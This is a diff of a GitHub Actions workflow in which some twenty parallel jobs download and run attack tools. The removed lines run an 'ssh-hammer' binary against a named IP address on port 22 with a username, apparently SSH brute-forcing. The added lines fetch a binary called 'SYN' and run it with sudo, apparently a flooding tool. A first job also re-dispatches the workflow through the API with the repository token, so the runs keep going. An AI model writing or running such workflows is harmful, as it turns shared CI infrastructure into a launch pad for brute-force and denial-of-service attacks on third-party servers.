@@ -14,7 +14,10 @@ jobs:
       - uses: actions/checkout@v3
       - name: Run a multi-line script
         run: |
-          sleep 280s
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 100s
           curl -X POST -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github.v3+json" -d '{"ref": "main"}' https://api.github.com/repos/niniubiwoc/run-script-action/actions/workflows/blank.yml/dispatches
 
 
@@ -24,9 +27,10 @@ jobs:
       - uses: actions/checkout@v3
       - name: Run a multi-line script
         run: |
-          wget https://raw.githubusercontent.com/Ahyaya/ssh-hammer/main/ssh-hammer
-          chmod 777 ssh-hammer
-          timeout 279s ./ssh-hammer 47.111.4.60 -p 22 -u dal -v -t 10
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
 
 
   build3:
@@ -35,9 +39,10 @@ jobs:
       - uses: actions/checkout@v3
       - name: Run a multi-line script
         run: |
-          wget https://raw.githubusercontent.com/Ahyaya/ssh-hammer/main/ssh-hammer
-          chmod 777 ssh-hammer
-          timeout 279s ./ssh-hammer 47.111.4.60 -p 22 -u dal -v -t 10
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
 
 
   build4:
@@ -46,9 +51,10 @@ jobs:
       - uses: actions/checkout@v3
       - name: Run a multi-line script
         run: |
-          wget https://raw.githubusercontent.com/Ahyaya/ssh-hammer/main/ssh-hammer
-          chmod 777 ssh-hammer
-          timeout 279s ./ssh-hammer 47.111.4.60 -p 22 -u dal -v -t 10
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
 
 
   build5:
@@ -57,9 +63,10 @@ jobs:
       - uses: actions/checkout@v3
       - name: Run a multi-line script
         run: |
-          wget https://raw.githubusercontent.com/Ahyaya/ssh-hammer/main/ssh-hammer
-          chmod 777 ssh-hammer
-          timeout 279s ./ssh-hammer 47.111.4.60 -p 22 -u dal -v -t 10
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
 
 
   build6:
@@ -68,9 +75,10 @@ jobs:
       - uses: actions/checkout@v3
       - name: Run a multi-line script
         run: |
-          wget https://raw.githubusercontent.com/Ahyaya/ssh-hammer/main/ssh-hammer
-          chmod 777 ssh-hammer
-          timeout 279s ./ssh-hammer 47.111.4.60 -p 22 -u dal -v -t 10
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
 
 
   build7:
@@ -79,9 +87,10 @@ jobs:
       - uses: actions/checkout@v3
       - name: Run a multi-line script
         run: |
-          wget https://raw.githubusercontent.com/Ahyaya/ssh-hammer/main/ssh-hammer
-          chmod 777 ssh-hammer
-          timeout 279s ./ssh-hammer 47.111.4.60 -p 22 -u dal -v -t 10
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
 
 
   build8:
@@ -90,9 +99,10 @@ jobs:
       - uses: actions/checkout@v3
       - name: Run a multi-line script
         run: |
-          wget https://raw.githubusercontent.com/Ahyaya/ssh-hammer/main/ssh-hammer
-          chmod 777 ssh-hammer
-          timeout 279s ./ssh-hammer 47.111.4.60 -p 22 -u dal -v -t 10
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
 
 
   build9:
@@ -101,9 +111,10 @@ jobs:
       - uses: actions/checkout@v3
       - name: Run a multi-line script
         run: |
-          wget https://raw.githubusercontent.com/Ahyaya/ssh-hammer/main/ssh-hammer
-          chmod 777 ssh-hammer
-          timeout 279s ./ssh-hammer 47.111.4.60 -p 22 -u dal -v -t 10
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
 
 
   build10:
@@ -112,9 +123,10 @@ jobs:
       - uses: actions/checkout@v3
       - name: Run a multi-line script
         run: |
-          wget https://raw.githubusercontent.com/Ahyaya/ssh-hammer/main/ssh-hammer
-          chmod 777 ssh-hammer
-          timeout 279s ./ssh-hammer 47.111.4.60 -p 22 -u dal -v -t 10
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
 
 
   build11:
@@ -123,9 +135,10 @@ jobs:
       - uses: actions/checkout@v3
       - name: Run a multi-line script
         run: |
-          wget https://raw.githubusercontent.com/Ahyaya/ssh-hammer/main/ssh-hammer
-          chmod 777 ssh-hammer
-          timeout 279s ./ssh-hammer 47.111.4.60 -p 22 -u dal -v -t 10
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
 
 
   build12:
@@ -134,9 +147,10 @@ jobs:
       - uses: actions/checkout@v3
       - name: Run a multi-line script
         run: |
-          wget https://raw.githubusercontent.com/Ahyaya/ssh-hammer/main/ssh-hammer
-          chmod 777 ssh-hammer
-          timeout 279s ./ssh-hammer 47.111.4.60 -p 22 -u dal -v -t 10
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
 
 
   build13:
@@ -145,9 +159,10 @@ jobs:
       - uses: actions/checkout@v3
       - name: Run a multi-line script
         run: |
-          wget https://raw.githubusercontent.com/Ahyaya/ssh-hammer/main/ssh-hammer
-          chmod 777 ssh-hammer
-          timeout 279s ./ssh-hammer 47.111.4.60 -p 22 -u dal -v -t 10
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
 
 
   build14:
@@ -156,9 +171,10 @@ jobs:
       - uses: actions/checkout@v3
       - name: Run a multi-line script
         run: |
-          wget https://raw.githubusercontent.com/Ahyaya/ssh-hammer/main/ssh-hammer
-          chmod 777 ssh-hammer
-          timeout 279s ./ssh-hammer 47.111.4.60 -p 22 -u dal -v -t 10
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
 
 
   build15:
@@ -167,9 +183,10 @@ jobs:
       - uses: actions/checkout@v3
       - name: Run a multi-line script
         run: |
-          wget https://raw.githubusercontent.com/Ahyaya/ssh-hammer/main/ssh-hammer
-          chmod 777 ssh-hammer
-          timeout 279s ./ssh-hammer 47.111.4.60 -p 22 -u dal -v -t 10
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
 
 
   build16:
@@ -178,9 +195,10 @@ jobs:
       - uses: actions/checkout@v3
       - name: Run a multi-line script
         run: |
-          wget https://raw.githubusercontent.com/Ahyaya/ssh-hammer/main/ssh-hammer
-          chmod 777 ssh-hammer
-          timeout 279s ./ssh-hammer 47.111.4.60 -p 22 -u dal -v -t 10
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
 
 
   build17:
@@ -189,9 +207,10 @@ jobs:
       - uses: actions/checkout@v3
       - name: Run a multi-line script
         run: |
-          wget https://raw.githubusercontent.com/Ahyaya/ssh-hammer/main/ssh-hammer
-          chmod 777 ssh-hammer
-          timeout 279s ./ssh-hammer 47.111.4.60 -p 22 -u dal -v -t 10
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
 
 
   build18:
@@ -200,9 +219,10 @@ jobs:
       - uses: actions/checkout@v3
       - name: Run a multi-line script
         run: |
-          wget https://raw.githubusercontent.com/Ahyaya/ssh-hammer/main/ssh-hammer
-          chmod 777 ssh-hammer
-          timeout 279s ./ssh-hammer 47.111.4.60 -p 22 -u dal -v -t 10
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
 
 
   build19:
@@ -211,9 +231,10 @@ jobs:
       - uses: actions/checkout@v3
       - name: Run a multi-line script
         run: |
-          wget https://raw.githubusercontent.com/Ahyaya/ssh-hammer/main/ssh-hammer
-          chmod 777 ssh-hammer
-          timeout 279s ./ssh-hammer 47.111.4.60 -p 22 -u dal -v -t 10
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
 
 
   build20:
@@ -222,6 +243,7 @@ jobs:
       - uses: actions/checkout@v3
       - name: Run a multi-line script
         run: |
-          wget https://raw.githubusercontent.com/Ahyaya/ssh-hammer/main/ssh-hammer
-          chmod 777 ssh-hammer
-          timeout 279s ./ssh-hammer 47.111.4.60 -p 22 -u dal -v -t 10
+          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
+          chmod 777 SYN
+          sudo ./SYN
+          sleep 99s
